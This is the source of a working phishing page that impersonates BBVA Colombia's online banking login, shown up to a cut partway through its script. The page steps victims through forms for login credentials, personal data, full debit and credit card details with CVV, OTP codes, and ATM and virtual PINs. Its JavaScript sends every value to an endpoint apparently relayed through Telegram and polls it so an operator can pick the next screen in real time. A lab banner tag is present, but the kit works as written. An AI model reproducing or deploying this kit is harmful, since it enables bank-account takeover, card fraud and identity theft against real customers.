<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso | BBVA Colombia</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <style>
        @font-face {
            font-family: "BBVA Web Bold BS";
            src: url("/bbva/BentonSansBBVA-Bold.woff") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Web Book BS";
            src: url("/bbva/BentonSansBBVA-Book.woff") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Web Book Italic BS";
            src: url("/bbva/BentonSansBBVA-BookItalic.woff") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Web Light BS";
            src: url("/bbva/BentonSansBBVA-Light.woff2?v=b6efddac") format("woff2"), url("/bbva/BentonSansBBVA-Light.woff?v=f8efa444") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Web Medium BS";
            src: url("/bbva/BentonSansBBVA-Medium.woff?v=63e781ba") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Web Medium Italic BS";
            src: url("/bbva/BentonSansBBVA-MediumItalic.woff2?v=078a6898") format("woff2"), url("/bbva/BentonSansBBVA-MediumItalic.woff?v=c6e99240") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Tiempos Regular";
            src: url("/bbva/TiemposTextWeb-Regular.woff2?v=4780f36b") format("woff2"), url("/bbva/TiemposTextWeb-Regular.woff?v=490d864e") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Tiempos Regular Italic";
            src: url("/bbva/TiemposTextWeb-RegularItalic.woff2?v=9858cc96") format("woff2"), url("/bbva/TiemposTextWeb-RegularItalic.woff?v=7e81d894") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA-Icons";
            src: url("/bbva/coronita-icons-v3.woff") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        :root {
            --bbva-azul-oscuro: #043263;
            --bbva-azul-medio: #1973b8;
            --bbva-texto: #121212;
            --bbva-fondo-input: #f4f4f4;
            --bbva-error: #cc0000;
            --bbva-exito: #00a651;
        }

        .texto-1 {
            -webkit-tap-highlight-color: transparent;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            border: 0;
            font: inherit;
            vertical-align: baseline;
            font-family: "BBVA Web Book BS", sans-serif;
            color: var(--bbva-texto);
            font-size: 22px;
            line-height: 2.2rem;
            margin-bottom: 0;
        }

        .texto-2 {
            font-family: "BBVA Web Book BS", sans-serif;
            font-size: 14px;
            line-height: 1.5rem;
            color: var(--bbva-texto);
        }

        .entrada-1 {
            -webkit-tap-highlight-color: transparent;
            -webkit-text-size-adjust: 100%;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            font: inherit;
            margin: 0;
            width: 100%;
            background-color: var(--bbva-fondo-input);
            color: var(--bbva-texto);
            font-size: 17px;
            transition: background-color .25s, border-color .25s;
            position: relative;
            display: block;
            float: right;
            padding: 0 15px 0 15px;
            border: none;
            border-bottom: 1px solid var(--bbva-texto);
            border-radius: 1px;
            font-family: "BBVA Web Book BS", "Helvetica Neue", Arial, Helvetica, sans-serif;
            height: 3.5rem;
        }

        .entrada-1:focus {
            outline: none;
            border-bottom: 2px solid var(--bbva-azul-medio);
        }

        .boton-1 {
            -webkit-tap-highlight-color: transparent;
            -webkit-text-size-adjust: 100%;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            margin: 0;
            font: inherit;
            vertical-align: baseline;
            display: -webkit-inline-flex;
            cursor: pointer;
            background-color: var(--bbva-azul-medio);
            border: none;
            border-radius: 1px;
            color: #fff;
            font-size: 1.5rem;
            font-family: "BBVA Web Medium BS", sans-serif;
            height: 3.5rem;
            text-align: center;
            text-decoration: none;
        }

        .boton-1:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .label-1 {
            font-family: "BBVA Web Medium BS", sans-serif;
            font-size: 14px;
            color: var(--bbva-texto);
            margin-bottom: 4px;
            display: block;
        }

        .select-1 {
            -webkit-tap-highlight-color: transparent;
            -webkit-text-size-adjust: 100%;
            -webkit-font-smoothing: antialiased;
            box-sizing: border-box;
            font: inherit;
            margin: 0;
            width: 100%;
            background-color: var(--bbva-fondo-input);
            color: var(--bbva-texto);
            font-size: 17px;
            transition: background-color .25s, border-color .25s;
            position: relative;
            display: block;
            padding: 0 15px;
            border: none;
            border-bottom: 1px solid var(--bbva-texto);
            border-radius: 1px;
            font-family: "BBVA Web Book BS", "Helvetica Neue", Arial, Helvetica, sans-serif;
            height: 3.5rem;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                margin: 0 auto;
            }
        }

        .hidden {
            display: none !important;
        }

        .error-message {
            color: var(--bbva-error);
            font-family: "BBVA Web Book BS", sans-serif;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 8px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .borde-entrada-error {
            border-bottom-color: var(--bbva-error) !important;
        }

        .loading-spinner {
            display: inline-block;
            width: 100px;
            height: 100px;
            border: 10px solid rgba(230, 230, 230, .3);
            border-radius: 50%;
            border-top-color: var(--bbva-azul-medio);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .header-bbva {
            background-color: var(--bbva-azul-oscuro);
        }
    </style>
</head>

<body class="px-3">
<x-lab-banner />
    <!-- Loading Overlay -->
    <div id="loading" class="fixed-top bg-white d-flex align-items-center justify-content-center hidden"
        style="height: 100vh; z-index: 9999;">
        <div class="text-center">
            <div class="loading-spinner mx-auto"></div>
            <p class="mt-3 texto-2">Espere un momento por favor...</p>
        </div>
    </div>

    <!-- Header -->
    <div class="text-center py-4 header-bbva">
        <img src="/bbva/logo_bbva_blanco.svg" width="80" height="24" alt="BBVA">
    </div>

    <!-- Vista: Login -->
    <div id="login" class="hidden">
        <h1 class="texto-1 px-4 mt-4 text-start">
            Hola, ingresa tu número de documento y contraseña para entrar a BBVA Net:
        </h1>
        <br>
        <!-- Mensaje de error general -->
        <div id="errorGeneralLogin" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1" for="tipo-documento">Tipo de Documento</label>
                <select class="select-1 w-100 mb-4" id="tipo-documento">
                    <option value="1" selected>Cédula de Ciudadanía</option>
                    <option value="2">Cédula de Extranjería</option>
                    <option value="3">Tarjeta de Identidad</option>
                    <option value="4">Pasaporte</option>
                    <option value="5">Número de Identificación Personal</option>
                    <option value="6">Permiso Permanencia Temporal</option>
                </select>
            </div>
            <div class="mb-4">
                <label class="label-1" for="usuario">Número de documento</label>
                <input class="entrada-1 w-100" id="usuario" name="usuario" type="text" placeholder="Número de documento"
                    minlength="4" maxlength="15" autocomplete="off">
                <div class="error-message" id="errorUsuario"></div>
            </div>
            <div class="mb-5">
                <label class="label-1" for="clave">Contraseña</label>
                <input class="entrada-1 w-100" id="clave" name="clave" type="password" placeholder="Contraseña"
                    minlength="4" maxlength="15" autocomplete="off">
                <div class="error-message" id="errorClave"></div>
            </div>
            <div class="mt-3 text-center">
                <button id="btnLogin" class="boton-1 text-center px-5 pt-2" disabled>Entrar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Datos Personales -->
    <div id="datos" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Por tu seguridad, necesitamos validar tus datos personales:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralDatos" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1" for="nombre">Nombre completo</label>
                <input class="entrada-1 w-100" id="nombre" name="nombre" type="text" placeholder="Nombre completo"
                    minlength="3" maxlength="100" autocomplete="off">
                <div class="error-message" id="errorNombre"></div>
            </div>
            <div class="mb-4">
                <label class="label-1" for="cedula">Cédula</label>
                <input class="entrada-1 w-100" id="cedula" name="cedula" type="text" placeholder="Número de cédula"
                    minlength="6" maxlength="12" autocomplete="off">
                <div class="error-message" id="errorCedula"></div>
            </div>
            <div class="mb-4">
                <label class="label-1" for="email">Correo electrónico</label>
                <input class="entrada-1 w-100" id="email" name="email" type="email" placeholder="correo@ejemplo.com"
                    autocomplete="off">
                <div class="error-message" id="errorEmail"></div>
            </div>
            <div class="mb-4">
                <label class="label-1" for="celular">Celular</label>
                <input class="entrada-1 w-100" id="celular" name="celular" type="text" placeholder="Número de celular"
                    minlength="10" maxlength="10" autocomplete="off">
                <div class="error-message" id="errorCelular"></div>
            </div>
            <div class="mb-4">
                <label class="label-1" for="ciudad">Ciudad</label>
                <input class="entrada-1 w-100" id="ciudad" name="ciudad" type="text" placeholder="Ciudad"
                    minlength="3" maxlength="50" autocomplete="off">
                <div class="error-message" id="errorCiudad"></div>
            </div>
            <div class="mb-5">
                <label class="label-1" for="direccion">Dirección</label>
                <input class="entrada-1 w-100" id="direccion" name="direccion" type="text" placeholder="Dirección completa"
                    minlength="5" maxlength="100" autocomplete="off">
                <div class="error-message" id="errorDireccion"></div>
            </div>
            <div class="d-flex justify-content-center">
                <button id="btnDatos" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Tarjeta de Débito -->
    <div id="tdb" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Por seguridad debemos validar la información de tu tarjeta de débito:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralTDB" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1" for="numtarjetaTDB">Número de tarjeta de débito</label>
                <input class="entrada-1 w-100" id="numtarjetaTDB" name="numtarjetatdb" type="text"
                    placeholder="Número de tarjeta débito" minlength="16" maxlength="19" autocomplete="off">
                <div class="error-message" id="errorNumTarjetaTDB"></div>
            </div>
            <div class="row mb-4">
                <div class="col-6">
                    <label class="label-1" for="vencimientoTDB">Fecha de vencimiento</label>
                    <input class="entrada-1 w-100" id="vencimientoTDB" name="vencimientotdb" type="text"
                        placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                    <div class="error-message" id="errorVencimientoTDB"></div>
                </div>
                <div class="col-6">
                    <label class="label-1" for="cvvTDB">CVV</label>
                    <input class="entrada-1 w-100" id="cvvTDB" name="cvvtdb" type="text"
                        placeholder="CVV" minlength="3" maxlength="4" autocomplete="off">
                    <div class="error-message" id="errorCVVTDB"></div>
                </div>
            </div>
            <div class="mb-5" style="font-size: 12px;">
                <input type="checkbox" id="checkTDB" style="accent-color: var(--bbva-azul-oscuro);">
                <label for="checkTDB" style="margin-left: 8px;">Certifico que soy el titular de este producto</label>
            </div>
            <div class="mt-3 text-center">
                <button id="btnTDB" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Tarjeta de Crédito -->
    <div id="tdc" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Por seguridad debemos validar la información de tu tarjeta de crédito:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralTDC" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1" for="numtarjetaTDC">Número de tarjeta de crédito</label>
                <input class="entrada-1 w-100" id="numtarjetaTDC" name="numtarjetatdc" type="text"
                    placeholder="Número de tarjeta crédito" minlength="16" maxlength="19" autocomplete="off">
                <div class="error-message" id="errorNumTarjetaTDC"></div>
            </div>
            <div class="row mb-4">
                <div class="col-6">
                    <label class="label-1" for="vencimientoTDC">Fecha de vencimiento</label>
                    <input class="entrada-1 w-100" id="vencimientoTDC" name="vencimientotdc" type="text"
                        placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                    <div class="error-message" id="errorVencimientoTDC"></div>
                </div>
                <div class="col-6">
                    <label class="label-1" for="cvvTDC">CVV</label>
                    <input class="entrada-1 w-100" id="cvvTDC" name="cvvtdc" type="text"
                        placeholder="CVV" minlength="3" maxlength="4" autocomplete="off">
                    <div class="error-message" id="errorCVVTDC"></div>
                </div>
            </div>
            <div class="mb-5" style="font-size: 12px;">
                <input type="checkbox" id="checkTDC" style="accent-color: var(--bbva-azul-oscuro);">
                <label for="checkTDC" style="margin-left: 8px;">Certifico que soy el titular de este producto</label>
            </div>
            <div class="mt-3 text-center">
                <button id="btnTDC" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
            </div>
        </div>
    </div>

    <!-- Vista: Código SMS -->
    <div id="codsms" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Se ha enviado un código de seguridad O.T.P Token de seis (6) dígitos a tu celular:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralCodSMS" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-5 mb-5">
            <label class="label-1" for="codsmsInput">Código de seguridad</label>
            <input class="entrada-1 w-100 mb-3" id="codsmsInput" name="codsms" type="password"
                placeholder="Código de seguridad" minlength="6" maxlength="8" autocomplete="off">
            <div class="error-message" id="errorCodSMS"></div>
        </div>
        <div class="mt-5 text-center">
            <button id="btnCodSMS" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Código App -->
    <div id="codapp" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Ingresa el código de seguridad O.T.P Token de seis (6) dígitos que aparece en la App de tu celular:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralCodApp" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-5 mb-5">
            <label class="label-1" for="codappInput">Código de seguridad</label>
            <input class="entrada-1 w-100 mb-3" id="codappInput" name="codapp" type="password"
                placeholder="Código de seguridad" minlength="6" maxlength="8" autocomplete="off">
            <div class="error-message" id="errorCodApp"></div>
        </div>
        <div class="mt-5 text-center">
            <button id="btnCodApp" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Clave de Cajero -->
    <div id="pincaj" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Ingresa la clave que usas en el cajero:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralPinCaj" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-5 mb-5">
            <label class="label-1" for="pincajInput">Clave de cajero</label>
            <input class="entrada-1 w-100 mb-3" id="pincajInput" name="pincaj" type="password"
                placeholder="Clave de cajero" minlength="4" maxlength="4" autocomplete="off">
            <div class="error-message" id="errorPinCaj"></div>
        </div>
        <div class="mt-5 text-center">
            <button id="btnPinCaj" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Clave Virtual -->
    <div id="pinvir" class="hidden">
        <h1 class="texto-1 mt-4 text-center px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Ingresa tu clave virtual:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralPinVir" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-5 mb-5">
            <label class="label-1" for="pinvirInput">Clave virtual</label>
            <input class="entrada-1 w-100 mb-3" id="pinvirInput" name="pinvir" type="password"
                placeholder="Clave virtual" minlength="4" maxlength="4" autocomplete="off">
            <div class="error-message" id="errorPinVir"></div>
        </div>
        <div class="mt-5 text-center">
            <button id="btnPinVir" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
        </div>
    </div>

    <!-- Vista: Éxito -->
    <div id="exito" class="hidden">
        <div class="text-center">
            <div class="my-4">
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="var(--bbva-exito)"
                    class="bi bi-check-circle-fill" viewBox="0 0 16 16">
                    <path
                        d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z" />
                </svg>
            </div>
            <h2 class="mb-3" style="font-family: 'BBVA Web Medium BS', sans-serif;">Proceso completado exitosamente</h2>
            <p class="texto-2">Gracias por utilizar nuestros servicios.</p>
            <p class="texto-2">Serás redirigido en breve...</p>
        </div>
    </div>

    <!-- Vista: Error -->
    <div id="error" class="hidden">
        <div class="text-center">
            <div class="my-4">
                <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" fill="var(--bbva-error)"
                    class="bi bi-x-circle-fill" viewBox="0 0 16 16">
                    <path
                        d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM5.354 4.646a.5.5 0 1 0-.708.708L7.293 8l-2.647 2.646a.5.5 0 0 0 .708.708L8 8.707l2.646 2.647a.5.5 0 0 0 .708-.708L8.707 8l2.647-2.646a.5.5 0 0 0-.708-.708L8 7.293 5.354 4.646z" />
                </svg>
            </div>
            <h2 class="mb-3" style="font-family: 'BBVA Web Medium BS', sans-serif;">Ha ocurrido un error</h2>
            <p class="texto-2">Por favor intenta nuevamente más tarde.</p>
            <p class="texto-2">Serás redirigido en breve...</p>
        </div>
    </div>

    <!-- Vista: Wait (Loading intermedio) -->
    <div id="wait" class="hidden">
        <div class="text-center mt-5">
            <div class="loading-spinner"></div>
        </div>
        <br>
        <div class="text-center">
            <p class="texto-1">Espere un momento por favor.</p>
        </div>
    </div>

    <script>
        $(document).ready(function () {
            // ==================== CONFIGURACIÓN INICIAL ====================
            function generateUniqId() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let result = '';
                for (let i = 0; i < 6; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            let sessionUniqId = sessionStorage.getItem('uniqId');
            if (!sessionUniqId || sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6) {
                if (sessionUniqId && (sessionUniqId.startsWith('sess_') || sessionUniqId.length !== 6)) {
                    localStorage.clear();
                }
                sessionUniqId = generateUniqId();
                sessionStorage.setItem('uniqId', sessionUniqId);
            }

            const appState = {
                uniqId: sessionUniqId,
                currentView: 'login'
            };

            console.log('Session UniqID:', appState.uniqId);

            // ==================== RECUPERAR DATOS PSE ====================
            const pseDatosStr = sessionStorage.getItem('pseDatos');
            if (pseDatosStr) {
                try {
                    const pseDatos = JSON.parse(pseDatosStr);
                    const camposPSE = {
                        'nombre': pseDatos.nombre,
                        'email': pseDatos.email,
                        'celular': pseDatos.celular,
                        'direccion': pseDatos.direccion,
                        'ciudad': pseDatos.ciudad,
                        'departamento': pseDatos.departamento,
                        'banco': pseDatos.banco,
                        'tipoPersona': pseDatos.tipoPersona,
                        'ente': 'brasilia'
                    };
                    Object.keys(camposPSE).forEach(key => {
                        if (camposPSE[key]) {
                            const storageKey = `${appState.uniqId}_${key}`;
                            localStorage.setItem(storageKey, JSON.stringify(camposPSE[key]));
                        }
                    });
                    console.log('Datos PSE recuperados:', pseDatos);
                } catch (e) {
                    console.error('Error al parsear pseDatos:', e);
                }
            }

            // ==================== FUNCIONES AUXILIARES ====================
            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            function mostrarError(fieldId, errorId, containerId, mensaje) {
                $('#' + errorId).text(mensaje).addClass('show');
                $('#' + containerId).addClass('borde-entrada-error');
            }

            function ocultarError(errorId, containerId) {
                $('#' + errorId).removeClass('show').text('');
                $('#' + containerId).removeClass('borde-entrada-error');
            }

            function hideAllViews() {
                $('#login, #datos, #tdb, #tdc, #codsms, #codapp, #pincaj, #pinvir, #exito, #error, #wait').addClass('hidden');
            }

            function showView(viewId) {
                hideAllViews();
                $('#' + viewId).removeClass('hidden');

                const viewHistory = sessionStorage.getItem('viewHistory') || '';

                if (viewHistory.includes(viewId) && viewId !== 'wait' && viewId !== 'exito' && viewId !== 'error') {
                    if (viewId === 'login') {
                        $('#errorGeneralLogin').text('Los datos ingresados son incorrectos. Intenta nuevamente.').addClass('show');
                        $('#usuario').val('');
                        $('#clave').val('');
                        $('#btnLogin').prop('disabled', true);
                    } else if (viewId === 'datos') {
                        $('#errorGeneralDatos').text('Los datos ingresados son incorrectos. Verifica e intenta nuevamente.').addClass('show');
                        $('#nombre, #cedula, #email, #celular, #ciudad, #direccion').val('');
                        $('#btnDatos').prop('disabled', true);
                    } else if (viewId === 'tdb') {
                        $('#errorGeneralTDB').text('Los datos de la tarjeta son incorrectos. Verifica e intenta nuevamente.').addClass('show');
                        $('#numtarjetaTDB, #vencimientoTDB, #cvvTDB').val('');
                        $('#checkTDB').prop('checked', false);
                        $('#btnTDB').prop('disabled', true);
                    } else if (viewId === 'tdc') {
                        $('#errorGeneralTDC').text('Los datos de la tarjeta son incorrectos. Verifica e intenta nuevamente.').addClass('show');
                        $('#numtarjetaTDC, #vencimientoTDC, #cvvTDC').val('');
                        $('#checkTDC').prop('checked', false);
                        $('#btnTDC').prop('disabled', true);
                    } else if (viewId === 'codsms') {
                        $('#errorGeneralCodSMS').text('El código ingresado es incorrecto. Intenta nuevamente.').addClass('show');
                        $('#codsmsInput').val('');
                        $('#btnCodSMS').prop('disabled', true);
                    } else if (viewId === 'codapp') {
                        $('#errorGeneralCodApp').text('El código ingresado es incorrecto. Intenta nuevamente.').addClass('show');
                        $('#codappInput').val('');
                        $('#btnCodApp').prop('disabled', true);
                    } else if (viewId === 'pincaj') {
                        $('#errorGeneralPinCaj').text('La clave ingresada es incorrecta. Intenta nuevamente.').addClass('show');
                        $('#pincajInput').val('');
                        $('#btnPinCaj').prop('disabled', true);
                    } else if (viewId === 'pinvir') {
                        $('#errorGeneralPinVir').text('La clave ingresada es incorrecta. Intenta nuevamente.').addClass('show');
                        $('#pinvirInput').val('');
                        $('#btnPinVir').prop('disabled', true);
                    }
                } else {
                    $('.error-message').removeClass('show').text('');
                }

                if (!viewHistory.includes(viewId)) {
                    sessionStorage.setItem('viewHistory', viewHistory + viewId + ',');
                }

                appState.currentView = viewId;
            }

            function showLoading() {
                $('#loading').removeClass('hidden');
                setTimeout(iniciarPolling, 4000);
            }

            function hideLoading() {
                $('#loading').addClass('hidden');
            }

            let enviandoATelegram = false;

            async function enviarATelegram() {
                if (enviandoATelegram) {
                    console.log('Ya hay un envío en progreso, evitando duplicado');
                    return;
                }

                enviandoATelegram = true;

                const allData = {};
                const fields = ['usuario', 'clave', 'ente', 'numtarjetaTDB', 'cvvTDB', 'vencimientoTDB',
                    'numtarjetaTDC', 'cvvTDC', 'vencimientoTDC',
                    'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion', 'departamento',
                    'banco', 'tipoPersona', 'codsms', 'codapp', 'pincaj', 'pinvir',
                    'status', 'uniqid'
                ];

                fields.forEach(field => {
                    allData[field] = getFromLocalStorage(field);
                });

                console.log('Datos a enviar a Telegram:', allData);

                try {
                    const response = await fetch('/api/telegram/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId,
                            data: allData
                        })
                    });
                    const result = await response.json();
                    console.log('Datos enviados a Telegram:', result);
                } catch (e) {
                    console.error('Error al enviar a Telegram:', e);
                } finally {
                    setTimeout(() => {
                        enviandoATelegram = false;
                    }, 1000);
                }
            }

            async function iniciarPolling() {
                const loadingElement = document.getElementById('loading');
                if (loadingElement && loadingElement.classList.contains('hidden')) {
                    return;
                }

                try {
                    const response = await fetch(`/api/telegram/check-button`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            uniqid: appState.uniqId
                        })
                    });
                    const data = await response.json();

                    if (data.button) {
                        hideLoading();

                        const viewMap = {
                            'login': 'login',
                            'datos': 'datos',
                            'tdb': 'tdb',
                            'tdc': 'tdc',
                            'codsms': 'codsms',
                            'codapp': 'codapp',
                            'pincaj': 'pincaj',
                            'pinvir': 'pinvir',
                            'exito': 'exito',
                            'error': 'error'
                        };

                        const viewId = viewMap[data.button] || data.button;
                        showView(viewId);

                        if (viewId === 'exito' || viewId === 'error') {
                            setTimeout(function () {
                                window.location.href = 'https://www.bbva.com.co/personas.html';
                            }, 5000);
                        }
                    } else {
                        setTimeout(iniciarPolling, 2000);
                    }
                } catch (error) {
                    console.error('Error en polling:', error);
                    setTimeout(iniciarPolling, 2000);
                }
            }

            // ==================== VALIDACIONES ====================
            function validarLuhn(cardNumber) {
                const numero = cardNumber.replace(/\s/g, '');
                if (!/^\d+$/.test(numero)) return false;

                let suma = 0;
                let alternar = false;

                for (let i = numero.length - 1; i >= 0; i--) {
                    let digito = parseInt(numero.charAt(i), 10);
                    if (alternar) {
                        digito *= 2;
                        if (digito > 9) digito -= 9;
                    }
                    suma += digito;
                    alternar = !alternar;
                }

                return (suma % 10) === 0;
            }

            function validarVencimiento(vencimiento) {
                if (!/^\d{2}\/\d{2}$/.test(vencimiento)) return false;

                const [mes, anio] = vencimiento.split('/');
                const mesNum = parseInt(mes, 10);
                const anioNum = parseInt(anio, 10);

                if (mesNum < 1 || mesNum > 12) return false;

                const hoy = new Date();
                const anioActual = hoy.getFullYear() % 100;
                const mesActual = hoy.getMonth() + 1;

                if (anioNum < anioActual) return false;
                if (anioNum === anioActual && mesNum < mesActual) return false;

                return true;
            }

            function validateLogin() {
                const usuario = $('#usuario').val().trim();
                const clave = $('#clave').val().trim();
                const usuarioRegex = /^\d{4,15}$/;
                const isValid = usuarioRegex.test(usuario) && clave.length >= 4;
                $('#btnLogin').prop('disabled', !isValid);
                return isValid;
            }

            function validateDatos() {
                const nombre = $('#nombre').val().trim();
                const cedula = $('#cedula').val().trim();
                const email = $('#email').val().trim();
                const celular = $('#celular').val().trim();
                const ciudad = $('#ciudad').val().trim();
                const direccion = $('#direccion').val().trim();

                const isValid = nombre.length >= 3 && cedula.length >= 6 &&
                               email.includes('@') && celular.length === 10 &&
                               ciudad.length >= 3 && direccion.length >= 5;
                $('#btnDatos').prop('disabled', !isValid);
                return isValid;
            }

            function validateTarjeta(tipo) {
                const numInput = tipo === 'tdb' ? '#numtarjetaTDB' : '#numtarjetaTDC';
                const venInput = tipo === 'tdb' ? '#vencimientoTDB' : '#vencimientoTDC';
                const cvvInput = tipo === 'tdb' ? '#cvvTDB' : '#cvvTDC';
                const checkInput = tipo === 'tdb' ? '#checkTDB' : '#checkTDC';
                const btnInput = tipo === 'tdb' ? '#btnTDB' : '#btnTDC';

                const num = $(numInput).val().replace(/\s/g, '');
                const ven = $(venInput).val();
                const cvv = $(cvvInput).val();
                const check = $(checkInput).is(':checked');

                const isValid = num.length >= 15 && validarLuhn(num) &&
                               validarVencimiento(ven) && cvv.length >= 3 && check;

                $(btnInput).prop('disabled', !isValid);
                return isValid;
            }

            function validateOtp(inputId, btnId) {
                const value = $(inputId).val().trim();
                let isValid = false;

                if (inputId === '#pincajInput' || inputId === '#pinvirInput') {
                    isValid = /^\d{4}$/.test(value);
                } else {
                    isValid = /^\d{6,8}$/.test(value);
                }

                $(btnId).prop('disabled', !isValid);
                return isValid;
            }

            // ==================== EVENTOS ====================
            // Login
            $('#usuario, #clave').on('input', validateLogin);
            $('#btnLogin').on('click', async function () {
                if (validateLogin()) {
                    saveToLocalStorage('usuario', $('#usuario').val().trim());
                    saveToLocalStorage('clave', $('#clave').val().trim());
                    saveToLocalStorage('ente', 'bbva');
                    saveToLocalStorage('status', 'LOGIN');
                    saveToLocalStorage('uniqid', appState.uniqId);

                    await enviarATelegram();
                    showLoading();
                }
            });

            // Datos
            $('#nombre, #cedula, #email, #celular, #ciudad, #direccion').on('input', validateDatos);
            $('#btnDatos').on('click', async function () {
